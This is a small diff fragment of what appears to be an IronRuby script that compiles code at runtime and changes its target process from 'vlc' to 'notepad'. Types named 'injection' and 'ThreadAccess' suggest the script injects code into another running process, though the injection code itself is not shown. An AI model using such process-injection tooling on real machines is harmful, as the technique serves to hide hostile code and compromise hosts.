@@ -97,7 +97,7 @@ code = %{
     return compile.CompiledAssembly
 end
 
-targetProcess = System::Diagnostics::Process.GetProcessesByName("vlc")[0]
+targetProcess = System::Diagnostics::Process.GetProcessesByName("notepad")[0]
 assembly = generate(code)
 injection = assembly.get_types()[0]
 ThreadAccess = assembly.get_types()[1]
